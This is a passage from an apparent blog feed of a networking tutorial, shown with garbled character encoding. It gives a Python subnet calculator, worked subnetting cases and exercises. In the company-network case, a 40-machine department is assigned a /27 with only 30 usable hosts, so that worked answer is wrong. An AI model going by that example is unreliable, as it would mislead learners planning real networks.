class="hljs-string">&quot;&quot;&quot;å°†IPåœ°å€è½¬æ¢ä¸ºæ•´æ•°&quot;&quot;&quot;</span><br>        parts = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">24</span>) + (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) + \<br>               (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">3</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_ip</span>(<span class="hljs-params">self, num</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å°†æ•´æ•°è½¬æ¢ä¸ºIPåœ°å€&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.&quot;</span> \<br>               <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;num &amp; <span class="hljs-number">255</span>&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_subnet</span>(<span class="hljs-params">self, ip, cidr</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        è®¡ç®—å­ç½‘ä¿¡æ¯</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: IPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string">            cidr: CIDRå€¼</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            åŒ…å«æ‰€æœ‰å­ç½‘ä¿¡æ¯çš„å­—å…¸</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># è½¬æ¢ä¸ºæ•´æ•°</span><br>        ip_int = <span class="hljs-variable language_">self</span>.ip_to_int(ip)<br><br>        <span class="hljs-comment"># è®¡ç®—å­ç½‘æ©ç </span><br>        mask = <span class="hljs-variable language_">self</span>.cidr_to_mask(cidr)<br>        mask_int = <span class="hljs-variable language_">self</span>.ip_to_int(mask)<br><br>        <span class="hljs-comment"># è®¡ç®—ç½‘ç»œåœ°å€ï¼ˆIP AND æ©ç ï¼‰</span><br>        network_int = ip_int &amp; mask_int<br>        network = <span class="hljs-variable language_">self</span>.int_to_ip(network_int)<br><br>        <span class="hljs-comment"># è®¡ç®—å¹¿æ’­åœ°å€ï¼ˆç½‘ç»œåœ°å€ OR åç æ©ç ï¼‰</span><br>        wildcard_int = ~mask_int &amp; <span class="hljs-number">0xFFFFFFFF</span>  <span class="hljs-comment"># é€šé…ç¬¦æ©ç ï¼ˆåç ï¼‰</span><br>        broadcast_int = network_int | wildcard_int<br>        broadcast = <span class="hljs-variable language_">self</span>.int_to_ip(broadcast_int)<br><br>        <span class="hljs-comment"># è®¡ç®—ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå¯ç”¨IP</span><br>        first_usable_int = network_int + <span class="hljs-number">1</span><br>        last_usable_int = broadcast_int - <span class="hljs-number">1</span><br><br>        first_usable = <span class="hljs-variable language_">self</span>.int_to_ip(first_usable_int)<br>        last_usable = <span class="hljs-variable language_">self</span>.int_to_ip(last_usable_int)<br><br>        <span class="hljs-comment"># è®¡ç®—ä¸»æœºæ•°</span><br>        host_bits = <span class="hljs-number">32</span> - cidr<br>        total_hosts = <span class="hljs-number">2</span> ** host_bits<br>        usable_hosts = total_hosts - <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> total_hosts &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># è®¡ç®—é€šé…ç¬¦æ©ç </span><br>        wildcard = <span class="hljs-variable language_">self</span>.int_to_ip(wildcard_int)<br><br>        result = &#123;<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: ip,<br>            <span class="hljs-string">&#x27;cidr&#x27;</span>: cidr,<br>            <span class="hljs-string">&#x27;mask&#x27;</span>: mask,<br>            <span class="hljs-string">&#x27;wildcard&#x27;</span>: wildcard,<br>            <span class="hljs-string">&#x27;network&#x27;</span>: network,<br>            <span class="hljs-string">&#x27;broadcast&#x27;</span>: broadcast,<br>            <span class="hljs-string">&#x27;first_usable&#x27;</span>: first_usable,<br>            <span class="hljs-string">&#x27;last_usable&#x27;</span>: last_usable,<br>            <span class="hljs-string">&#x27;total_hosts&#x27;</span>: total_hosts,<br>            <span class="hljs-string">&#x27;usable_hosts&#x27;</span>: usable_hosts<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">split_subnet</span>(<span class="hljs-params">self, ip, old_cidr, new_cidr</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å°†ä¸€ä¸ªå­ç½‘åˆ’åˆ†ä¸ºå¤šä¸ªæ›´å°çš„å­ç½‘</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: åŸå§‹ç½‘ç»œåœ°å€</span><br><span class="hljs-string">            old_cidr: åŸå§‹CIDR</span><br><span class="hljs-string">            new_cidr: æ–°çš„CIDRï¼ˆå¿…é¡»å¤§äºold_cidrï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            å­ç½‘åˆ—è¡¨</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> new_cidr &lt;= old_cidr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># è®¡ç®—å¯ä»¥åˆ’åˆ†å¤šå°‘ä¸ªå­ç½‘</span><br>        num_subnets = <span class="hljs-number">2</span> ** (new_cidr - old_cidr)<br><br>        <span class="hljs-comment"># è®¡ç®—æ¯ä¸ªå­ç½‘çš„å¤§å°</span><br>        subnet_size = <span class="hljs-number">2</span> ** (<span class="hljs-number">32</span> - new_cidr)<br><br>        <span class="hljs-comment"># è·å–èµ·å§‹ç½‘ç»œåœ°å€</span><br>        start_int = <span class="hljs-variable language_">self</span>.ip_to_int(ip) &amp; <span class="hljs-variable language_">self</span>.ip_to_int(<span class="hljs-variable language_">self</span>.cidr_to_mask(old_cidr))<br><br>        subnets = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_subnets):<br>            subnet_ip_int = start_int + (i * subnet_size)<br>            subnet_ip = <span class="hljs-variable language_">self</span>.int_to_ip(subnet_ip_int)<br>            subnets.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;subnet_ip&#125;</span>/<span class="hljs-subst">&#123;new_cidr&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> subnets<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_subnet_info</span>(<span class="hljs-params">self, info</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ‰“å°å­ç½‘ä¿¡æ¯</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            info: calculate_subnet()è¿”å›çš„å­—å…¸</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å­ç½‘ä¿¡æ¯&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“ IPåœ°å€:          <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ”¢ CIDR:            /<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;cidr&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ­ å­ç½‘æ©ç :        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;mask&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸƒ é€šé…ç¬¦æ©ç :      <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;wildcard&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸŒ ç½‘ç»œåœ°å€:        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;network&#x27;</span>]&#125;</span>/<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;cidr&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“¡ å¹¿æ’­åœ°å€:        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;broadcast&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ ç¬¬ä¸€ä¸ªå¯ç”¨IP:    <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;first_usable&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ æœ€åä¸€ä¸ªå¯ç”¨IP:  <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;last_usable&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“Š æ€»ä¸»æœºæ•°:        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;total_hosts&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… å¯ç”¨ä¸»æœºæ•°:      <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;usable_hosts&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    calc = SubnetCalculator()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å­ç½‘è®¡ç®—å™¨&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nè¯·é€‰æ‹©åŠŸèƒ½:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. è®¡ç®—å­ç½‘ä¿¡æ¯&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. CIDR â†” å­ç½‘æ©ç è½¬æ¢&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. å­ç½‘åˆ’åˆ†&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. å¿«é€ŸæŸ¥è¯¢å¸¸ç”¨CIDR&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. é€€å‡º&quot;</span>)<br><br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥é€‰é¡¹: &quot;</span>).strip()<br><br>        <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nå†è§ï¼&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥IPåœ°å€: &quot;</span>).strip()<br>            cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥CIDRï¼ˆå¦‚24ï¼‰: &quot;</span>).strip()<br><br>            <span class="hljs-keyword">try</span>:<br>                cidr = <span class="hljs-built_in">int</span>(cidr)<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= cidr &lt;= <span class="hljs-number">32</span>:<br>                    info = calc.calculate_subnet(ip, cidr)<br>                    calc.print_subnet_info(info)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ CIDRå¿…é¡»åœ¨0-32ä¹‹é—´&quot;</span>)<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ è¯·è¾“å…¥æœ‰æ•ˆçš„æ•°å­—&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nè¯·é€‰æ‹©è½¬æ¢æ–¹å‘:&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. CIDR â†’ å­ç½‘æ©ç &quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. å­ç½‘æ©ç  â†’ CIDR&quot;</span>)<br><br>            sub_choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥é€‰é¡¹: &quot;</span>).strip()<br><br>            <span class="hljs-keyword">if</span> sub_choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥CIDR: &quot;</span>).strip()<br>                <span class="hljs-keyword">try</span>:<br>                    cidr = <span class="hljs-built_in">int</span>(cidr)<br>                    mask = calc.cidr_to_mask(cidr)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n/<span class="hljs-subst">&#123;cidr&#125;</span> = <span class="hljs-subst">&#123;mask&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">except</span> ValueError:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ è¯·è¾“å…¥æœ‰æ•ˆçš„æ•°å­—&quot;</span>)<br><br>            <span class="hljs-keyword">elif</span> sub_choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>                mask = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥å­ç½‘æ©ç : &quot;</span>).strip()<br>                <span class="hljs-keyword">try</span>:<br>                    cidr = calc.mask_to_cidr(mask)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;mask&#125;</span> = /<span class="hljs-subst">&#123;cidr&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ è¯·è¾“å…¥æœ‰æ•ˆçš„å­ç½‘æ©ç &quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥ç½‘ç»œåœ°å€: &quot;</span>).strip()<br>            old_cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥åŸå§‹CIDR: &quot;</span>).strip()<br>            new_cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æ–°çš„CIDR: &quot;</span>).strip()<br><br>            <span class="hljs-keyword">try</span>:<br>                old_cidr = <span class="hljs-built_in">int</span>(old_cidr)<br>                new_cidr = <span class="hljs-built_in">int</span>(new_cidr)<br><br>                subnets = calc.split_subnet(ip, old_cidr, new_cidr)<br><br>                <span class="hljs-keyword">if</span> subnets:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“Š å°† <span class="hljs-subst">&#123;ip&#125;</span>/<span class="hljs-subst">&#123;old_cidr&#125;</span> åˆ’åˆ†ä¸º /<span class="hljs-subst">&#123;new_cidr&#125;</span> å­ç½‘:&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   å…± <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(subnets)&#125;</span> ä¸ªå­ç½‘\n&quot;</span>)<br>                    <span class="hljs-keyword">for</span> i, subnet <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subnets, <span class="hljs-number">1</span>):<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   <span class="hljs-subst">&#123;i&#125;</span>. <span class="hljs-subst">&#123;subnet&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ æ–°CIDRå¿…é¡»å¤§äºåŸCIDR&quot;</span>)<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ è¯·è¾“å…¥æœ‰æ•ˆçš„æ•°å­—&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;4&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nå¸¸ç”¨CIDRé€ŸæŸ¥è¡¨ï¼š&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;CIDR&#x27;</span>:&lt;<span class="hljs-number">8</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;å­ç½‘æ©ç &#x27;</span>:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;å¯ç”¨ä¸»æœºæ•°&#x27;</span>:&lt;<span class="hljs-number">12</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;è¯´æ˜&#x27;</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br><br>            common_cidrs = [<br>                (<span class="hljs-number">8</span>, <span class="hljs-string">&quot;Aç±»é»˜è®¤&quot;</span>),<br>                (<span class="hljs-number">16</span>, <span class="hljs-string">&quot;Bç±»é»˜è®¤&quot;</span>),<br>                (<span class="hljs-number">24</span>, <span class="hljs-string">&quot;Cç±»é»˜è®¤&quot;</span>),<br>                (<span class="hljs-number">25</span>, <span class="hljs-string">&quot;Cç±»åˆ†2ä¸ªå­ç½‘&quot;</span>),<br>                (<span class="hljs-number">26</span>, <span class="hljs-string">&quot;Cç±»åˆ†4ä¸ªå­ç½‘&quot;</span>),<br>                (<span class="hljs-number">27</span>, <span class="hljs-string">&quot;Cç±»åˆ†8ä¸ªå­ç½‘&quot;</span>),<br>                (<span class="hljs-number">28</span>, <span class="hljs-string">&quot;Cç±»åˆ†16ä¸ªå­ç½‘&quot;</span>),<br>                (<span class="hljs-number">29</span>, <span class="hljs-string">&quot;å°å‹å­ç½‘&quot;</span>),<br>                (<span class="hljs-number">30</span>, <span class="hljs-string">&quot;ç‚¹å¯¹ç‚¹é“¾è·¯&quot;</span>),<br>            ]<br><br>            <span class="hljs-keyword">for</span> cidr, desc <span class="hljs-keyword">in</span> common_cidrs:<br>                mask = calc.cidr_to_mask(cidr)<br>                hosts = <span class="hljs-number">2</span> ** (<span class="hljs-number">32</span> - cidr) - <span class="hljs-number">2</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;cidr:&lt;<span class="hljs-number">7</span>&#125;</span> <span class="hljs-subst">&#123;mask:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;hosts:&lt;<span class="hljs-number">12</span>&#125;</span> <span class="hljs-subst">&#123;desc&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day09/day09_subnet_calculator.py<br></code></pre></td></tr></table></figure><h2 id="ğŸ’¡-å®æˆ˜æ¡ˆä¾‹">ğŸ’¡ å®æˆ˜æ¡ˆä¾‹</h2><h3 id="æ¡ˆä¾‹1ï¼šå…¬å¸ç½‘ç»œè§„åˆ’">æ¡ˆä¾‹1ï¼šå…¬å¸ç½‘ç»œè§„åˆ’</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">éœ€æ±‚ï¼š<br>å…¬å¸æœ‰200å°ç”µè„‘ï¼Œåˆ†å¸ƒåœ¨4ä¸ªéƒ¨é—¨<br><span class="hljs-bullet">-</span> é”€å”®éƒ¨ï¼š60å°<br><span class="hljs-bullet">-</span> æŠ€æœ¯éƒ¨ï¼š80å°<br><span class="hljs-bullet">-</span> è¡Œæ”¿éƒ¨ï¼š40å°<br><span class="hljs-bullet">-</span> è´¢åŠ¡éƒ¨ï¼š20å°<br><br>ç»™å®šç½‘ç»œï¼š192.168.0.0/24<br><br>æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">1.</span> æŠ€æœ¯éƒ¨ï¼š192.168.0.0/25ï¼ˆ126å°ä¸»æœºï¼‰<br><span class="hljs-bullet">2.</span> é”€å”®éƒ¨ï¼š192.168.0.128/26ï¼ˆ62å°ä¸»æœºï¼‰<br><span class="hljs-bullet">3.</span> è¡Œæ”¿éƒ¨ï¼š192.168.0.192/27ï¼ˆ30å°ä¸»æœºï¼‰<br><span class="hljs-bullet">4.</span> è´¢åŠ¡éƒ¨ï¼š192.168.0.224/27ï¼ˆ30å°ä¸»æœºï¼‰<br></code></pre></td></tr></table></figure><h3 id="æ¡ˆä¾‹2ï¼šå®¶åº­ç½‘ç»œ">æ¡ˆä¾‹2ï¼šå®¶åº­ç½‘ç»œ</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">éœ€æ±‚ï¼š<br>å®¶é‡Œæœ‰<span class="hljs-number">10</span>å°è®¾å¤‡ï¼Œä½¿ç”¨Cç±»ç§ç½‘<br><br>æ–¹æ¡ˆï¼š<br>ç½‘ç»œï¼š<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>- å¯ç”¨IPï¼š<span class="hljs-number">192.168.1.1</span> - <span class="hljs-number">192.168.1.254</span><br>- è·¯ç”±å™¨ï¼š<span class="hljs-number">192.168.1.1</span><br>- è®¾å¤‡ï¼š<span class="hljs-number">192.168.1.100</span>-<span class="hljs-number">109</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><p>ä»Šå¤©å­¦ä¹ äº†ï¼š</p><ol><li>âœ… å­ç½‘æ©ç ç”¨äºåŒºåˆ†ç½‘ç»œéƒ¨åˆ†å’Œä¸»æœºéƒ¨åˆ†</li><li>âœ… CIDRæ˜¯å­ç½‘æ©ç çš„ç®€å†™å½¢å¼</li><li>âœ… å¯ç”¨ä¸»æœºæ•° = 2^ä¸»æœºä½æ•° - 2</li><li>âœ… ç½‘ç»œåœ°å€ã€å¹¿æ’­åœ°å€çš„è®¡ç®—æ–¹æ³•</li><li>âœ… å­ç½‘åˆ’åˆ†çš„å®é™…åº”ç”¨</li></ol><h3 id="é‡è¦å…¬å¼">é‡è¦å…¬å¼</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">å¯ç”¨ä¸»æœºæ•° = <span class="hljs-number">2</span>^(<span class="hljs-number">32</span>-<span class="hljs-built_in">CIDR</span>) - <span class="hljs-number">2</span><br>å­ç½‘æ•°é‡ = <span class="hljs-number">2</span>^(æ–°<span class="hljs-built_in">CIDR</span> - æ—§<span class="hljs-built_in">CIDR</span>)<br>å—å¤§å° = <span class="hljs-number">256</span> - å­ç½‘æ©ç çš„å˜åŒ–å…«ä½<br></code></pre></td></tr></table></figure><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šåŸºç¡€è®¡ç®—">ç»ƒä¹ 1ï¼šåŸºç¡€è®¡ç®—</h3><p>è®¡ç®—ä»¥ä¸‹å­ç½‘çš„ä¿¡æ¯ï¼š</p><ol><li>192.168.10.0/24</li><li>172.16.0.0/16</li><li>10.0.0.0/8</li></ol><h3 id="ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†">ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†</h3><p>å°†192.168.1.0/24åˆ’åˆ†ä¸ºï¼š</p><ol><li>2ä¸ªç›¸ç­‰çš„å­ç½‘</li><li>4ä¸ªç›¸ç­‰çš„å­ç½‘</li><li>8ä¸ªç›¸ç­‰çš„å­ç½‘</li></ol><h3 id="ç»ƒä¹ 3ï¼šå®é™…åº”ç”¨">ç»ƒä¹ 3ï¼šå®é™…åº”ç”¨</h3><p>ä¸€ä¸ªå…¬å¸æœ‰ä»¥ä¸‹éœ€æ±‚ï¼š</p><ul><li>éƒ¨é—¨Aï¼šéœ€è¦50å°ä¸»æœº</li><li>éƒ¨é—¨Bï¼šéœ€è¦30å°ä¸»æœº</li><li>éƒ¨é—¨Cï¼šéœ€è¦20å°ä¸»æœº</li></ul><p>ç»™å®š192.168.0.0/24ï¼Œå¦‚ä½•åˆ’åˆ†ï¼Ÿ</p><h3 id="ç»ƒä¹ 4ï¼šè¿›é˜¶é¢˜ç›®">ç»ƒä¹ 4ï¼šè¿›é˜¶é¢˜ç›®</h3><p>å¦‚ä½•åˆ¤æ–­ä¸¤ä¸ªIPæ˜¯å¦åœ¨åŒä¸€å­ç½‘ï¼Ÿ</p><ul><li>IP1: 192.168.1.100/25</li><li>IP2: 192.168.1.150/25</li></ul><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šå­ç½‘åˆ’åˆ†æ˜¯ç½‘ç»œè§„åˆ’çš„åŸºæœ¬åŠŸï¼</p><p>ğŸ‘‰ <a href="day08.md">ä¸Šä¸€å¤©ï¼šIPåœ°å€è¯¦è§£</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day10.md">ä¸‹ä¸€å¤©ï¼šMACåœ°å€å’ŒARP</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8å¤©ï¼šIPåœ°å€è¯¦è§£</title>
    <link href="/2025/11/10/8%E5%A4%A9%EF%BC%9AIP%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/8%E5%A4%A9%EF%BC%9AIP%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3/</url>
    
